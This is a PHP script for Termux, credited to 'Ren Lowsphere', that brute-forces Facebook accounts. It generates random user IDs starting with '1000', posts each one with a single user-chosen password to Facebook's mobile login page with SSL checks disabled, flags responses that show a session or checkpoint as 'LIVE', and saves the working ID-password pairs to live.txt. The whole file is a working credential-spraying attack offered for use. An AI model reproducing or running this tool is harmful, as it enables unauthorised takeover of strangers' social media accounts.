<?php $q0="\033[1;31m";
$n1="\033[1;33m";
$f2="\033[1;32m";
system("clear");
  echo "
       _____
      |       |    |    |     /\       ______   |   /
      |_____  |    |    |    /  \     /         |  /
      |    __{|}__ |----|   /----\   |          |--
      |      |||   |    |  /      \  |          |  \
      |      \|/   |    | /        \  \______   |   \
              ~~~~~~>   V1.0  by Ren Lowsphere
              

 ";
 system("termux-open-url https://renlowsphere.surge.sh");
  sleep(1);
$h3 = "https://m.facebook.com/login.php";
$b4 = readline("~>[#] Password: ");
$w5 = readline(" ~>[#] Count: ");
sleep(1);
echo" _______________________________________________\n";
for( $n6 = 0; $n6<$w5; $n6++ ){
$k7 = curl_init();
$m8 = ("1000".rand(0,9).rand(0,9).rand(0,9). rand(0,9). rand(0,9). rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9));
curl_setopt($k7, CURLOPT_REFERER,
   "https://www.facebook.com");
   $n9 = "$m8 | $b4";
curl_setopt($k7, CURLOPT_HTTPHEADER, array('Accept: application/json'));
curl_setopt($k7, CURLOPT_URL, $h3);
curl_setopt($k7, CURLOPT_POSTFIELDS,'email='.urlencode($m8).'&pass='.urlencode($b4).'&login=Login');
curl_setopt($k7, CURLOPT_POST, 1);

 curl_setopt($k7, CURLOPT_HEADER, 0);

 curl_setopt($k7, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($k7, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($k7, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($k7, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($k7, CURLOPT_USERAGENT, "Mozilla/5.0 (Android 8.1.0; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0");
curl_setopt($k7, CURLINFO_HEADER_OUT, true);
    $m10 = curl_exec($k7);
    $x11 = "c_user";
    $j12 = "home";
    $z13 = "checkpoint";
    $s14 = curl_getinfo($k7, CURLINFO_HEADER_OUT);
    if(strpos($s14, $x11) !== false){
echo "$f2[LIVE]$n1 $n9 \n";
     file_put_contents("live.txt", "$n9 \n");  }
    if(strpos($s14, $j12) !== false){
echo "$f2[LIVE]$n1 $n9 \n";file_put_contents("live.txt", "$n9 \n");
}
    if (strpos($s14,  $z13) !== false){
echo "[$q0 Checkpoint $n1]$n9 \n";    }
    $z15 = "recover";
    if(strpos($s14, $z15) !== false){
    	echo "[$q0 Die $n1]$n9 \n";
    }
    $c16 = "email";
    if(strpos($s14, $c16) !== false){
    	echo "[$q0 Die $n1]$n9 \n";
    }}
?>